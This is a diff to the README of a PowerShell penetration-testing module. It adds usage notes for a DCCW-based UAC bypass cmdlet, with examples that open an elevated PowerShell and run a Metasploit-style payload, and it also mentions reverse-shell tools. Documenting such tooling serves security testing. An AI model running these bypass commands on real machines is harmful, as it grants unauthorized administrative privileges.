@@ -190,4 +190,13 @@ Test-KerberosDoubleHop -ComputerResults -AdminResults
 # This example checks for and displays Computer and Admin AD Objects vulnerable to a Kerberos Double Hop on the domain controller you are logged into
 ```
 
+- Invoke-DccwUACBypass is used to bypass UAC without a password if you are a member of an administrator group. This exploits DCCW's functionality to achieve this task. If the settings do not allow for this to work this cmdlet will stop execution. If the settings do allow this to work it will tell you what to do to defend against this.
+```powershell
+Invoke-DccwUACBypass -Program "cmd /c start powershell"
+# This example exploits the DCCW UAC bypass method to open PowerShell with administrative privileges
+
+Invoke-DccwUACBypass -Program "cmd /c start mfs.exe"
+# This example exploits the DCCW UAC bypass method to execute the payload msf.exe with administrative privileges
+```
+
 For more information on Start-Listener, Start-Bind, and Invoke-ReversePowerShell see [https://github.com/tobor88/ReversePowerShell](https://github.com/tobor88/ReversePowerShell)
